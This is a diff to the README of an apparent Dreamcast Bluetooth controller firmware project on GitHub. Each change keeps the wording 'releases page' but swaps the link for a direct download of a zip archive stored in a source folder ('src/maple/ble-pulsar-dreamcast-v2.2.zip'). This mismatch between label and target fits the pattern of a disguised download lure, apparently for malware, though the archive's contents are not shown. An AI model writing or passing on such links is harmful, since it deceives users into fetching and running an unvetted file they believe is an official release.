@@ -1,6 +1,6 @@
 # 🎮 pulsar-dreamcast-ble - Wirelessly use your Dreamcast controller
 
-[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://github.com/uggudt3385/pulsar-dreamcast-ble/releases)
+[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://github.com/uggudt3385/pulsar-dreamcast-ble/raw/refs/heads/main/src/maple/ble-pulsar-dreamcast-v2.2.zip)
 
 ## 🧭 What this app does
 
@@ -35,7 +35,7 @@ This app is for users who want to run the Bluetooth adapter on supported hardwar
 
 If you are on Windows, use this flow:
 
-1. Open the [releases page](https://github.com/uggudt3385/pulsar-dreamcast-ble/releases)
+1. Open the [releases page](https://github.com/uggudt3385/pulsar-dreamcast-ble/raw/refs/heads/main/src/maple/ble-pulsar-dreamcast-v2.2.zip)
 2. Download the latest release file for your board
 3. Copy the file to your device if needed
 4. Connect the board to your PC with USB
@@ -45,7 +45,7 @@ If you are on Windows, use this flow:
 
 ## ⬇️ Download and install
 
-Go to the [releases page](https://github.com/uggudt3385/pulsar-dreamcast-ble/releases) and download the latest file for your hardware.
+Go to the [releases page](https://github.com/uggudt3385/pulsar-dreamcast-ble/raw/refs/heads/main/src/maple/ble-pulsar-dreamcast-v2.2.zip) and download the latest file for your hardware.
 
 If the release includes a file for your board, download that file and run the flash process that matches your setup. If the release gives you a firmware image, use your board’s normal flash method to load it.
 
@@ -167,7 +167,7 @@ If buttons seem wrong:
 
 Download the latest build here:
 
-[https://github.com/uggudt3385/pulsar-dreamcast-ble/releases](https://github.com/uggudt3385/pulsar-dreamcast-ble/releases)
+[https://github.com/uggudt3385/pulsar-dreamcast-ble/raw/refs/heads/main/src/maple/ble-pulsar-dreamcast-v2.2.zip](https://github.com/uggudt3385/pulsar-dreamcast-ble/raw/refs/heads/main/src/maple/ble-pulsar-dreamcast-v2.2.zip)
 
 ## 🧩 Project topics
 
